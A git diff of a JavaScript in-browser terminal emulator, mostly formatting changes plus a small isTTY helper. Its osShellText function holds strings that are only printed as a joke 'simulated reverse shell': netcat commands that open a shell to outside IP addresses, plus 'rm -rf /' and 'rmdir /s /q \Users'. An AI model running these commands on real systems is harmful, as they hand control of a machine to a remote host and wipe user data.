@@ -38,9 +38,9 @@ const SystemCommands = [
 
         term.writeln(
           "\t" +
-          colorize(TermColors.Green, id) +
-          getSpacing(firstCommandSpacing - id.length) +
-          description
+            colorize(TermColors.Green, id) +
+            getSpacing(firstCommandSpacing - id.length) +
+            description,
         );
       }
     },
@@ -65,7 +65,7 @@ const SystemCommands = [
       const command = SystemCommands.find((c) => c.id === args[0]);
       if (!command) {
         term.writeln(
-          colorize(TermColors.Red, `[error]: command "${args[0]}" not found`)
+          colorize(TermColors.Red, `[error]: command "${args[0]}" not found`),
         );
         return;
       }
@@ -80,16 +80,22 @@ const SystemCommands = [
 ];
 
 function osShellText() {
-  const userAgent = (navigator.userAgentData.platform ?? navigator.platform).toLowerCase();
-  if (userAgent.includes('win')) {
-    return ['ncat 10.88.89.199 7877 -e cmd.exe\r\n', '', 'C:\\> rmdir /s /q \\Users\r\n'];
+  const userAgent = (
+    navigator.userAgentData.platform ?? navigator.platform
+  ).toLowerCase();
+  if (userAgent.includes("win")) {
+    return [
+      "ncat 10.88.89.199 7877 -e cmd.exe\r\n",
+      "",
+      "C:\\> rmdir /s /q \\Users\r\n",
+    ];
   }
-  return ['nc -e /bin/sh 10.10.198.166 9898\r\n', '', '#$ rm -rf /\r\n'];
+  return ["nc -e /bin/sh 10.10.198.166 9898\r\n", "", "#$ rm -rf /\r\n"];
 }
 
 async function simulateReverseShell(term) {
   for (const cmd of osShellText()) {
-    if (cmd === '') {
+    if (cmd === "") {
       await sleep(800);
       continue;
     }
@@ -100,12 +106,16 @@ async function simulateReverseShell(term) {
   }
 }
 
+export function isTTY(cmdID) {
+  return SystemCommands.find((c) => c.id === cmdID)?.process;
+}
+
 /**
-  * @param userInput {string}
+ * @param userInput {string}
  * @returns {string|null} Process ID if command executed started a process
  * */
 export async function exec(term, userInput, onProcessExit) {
-  if (userInput.includes("rm -rf")) {
+  if (userInput.includes("rm -r")) {
     await simulateReverseShell(term);
     await exit.exec(term);
     return exit.id;
@@ -115,7 +125,7 @@ export async function exec(term, userInput, onProcessExit) {
   const command = SystemCommands.find((c) => c.id === input);
   if (!command) {
     throw new Error(
-      'Command not found. Type "help" to list available commands'
+      'Command not found. Type "help" to list available commands',
     );
   }
 
@@ -129,11 +139,12 @@ export async function exec(term, userInput, onProcessExit) {
   ) {
     throw new Error(
       "not enough arguments\r\n" +
-      colorize(TermColors.Reset, `usage: ${command.usage}`)
+        colorize(TermColors.Reset, `usage: ${command.usage}`),
     );
   }
 
   await command.exec(term, args, onProcessExit);
+
   if (command.process) {
     return command.id;
   }
